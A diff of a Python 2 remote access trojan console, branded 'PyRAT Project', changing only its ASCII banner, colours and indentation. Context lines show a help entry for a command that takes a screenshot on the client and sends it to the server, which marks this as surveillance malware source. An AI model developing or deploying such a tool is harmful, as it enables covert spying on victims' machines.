@@ -38,8 +38,8 @@ def crypt(TEXT, encode=True):
         return base64.b64decode(TEXT)
 
 def logo():
-    print bright +blue + """ 
-$$$$$$$\            $$$$$$$\   $$$$$$\ $$$$$$$$\       
+    logo = blue + """ 
+%s$$$$$$$\            $$$$$$$\   $$$$$$\ $$$$$$$$\       
 $$  __$$\           $$  __$$\ $$  __$$\\__$$  __|      
 $$ |  $$ |$$\   $$\ $$ |  $$ |$$ /  $$ |  $$ |         
 $$$$$$$  |$$ |  $$ |$$$$$$$  |$$$$$$$$ |  $$ |         
@@ -48,10 +48,16 @@ $$ |      $$ |  $$ |$$ |  $$ |$$ |  $$ |  $$ |
 $$ |      \$$$$$$$ |$$ |  $$ |$$ |  $$ |  $$ |         
 \__|       \____$$ |\__|  \__|\__|  \__|  \__|         
           $$\   $$ |                                   
-          \$$$$$$  |      github.com/blackvkng                           
+          \$$$$$$  |                           
            \______/                           
-"""
-	
+
+
+\t%s%s[>]--->       PyRAT Project      <---[<]%s
+\t[>]--->       Version: 1.0       <---[<]
+\t[>]--->   github.com/blackvkng   <---[<]
+\t[>]--->       %sBlack Viking%s       <---[<]
+"""%(Style.BRIGHT, red, Style.BRIGHT, Style.NORMAL, Style.BRIGHT, Style.NORMAL)
+    print logo
     help()
     print bright + white + "="*80
     
@@ -139,7 +145,7 @@ def decrypt_db():
     a.close()
 
 def help():
-    print Fore.YELLOW + """
+    print green + """
 Commands:
     help()                  : Show this message.
     screenshot()            : Take a screenshot on client and send image file to server.
@@ -217,8 +223,8 @@ def start():
             main()
             menu()
         except Exception as e:
-	    print bright + Fore.RED + "Error:\n%s\n"%(e)
-	    start()
+            print bright + Fore.RED + "Error:\n%s\n"%(e)
+            start()
 
 if __name__ == "__main__":
     init(autoreset=True)
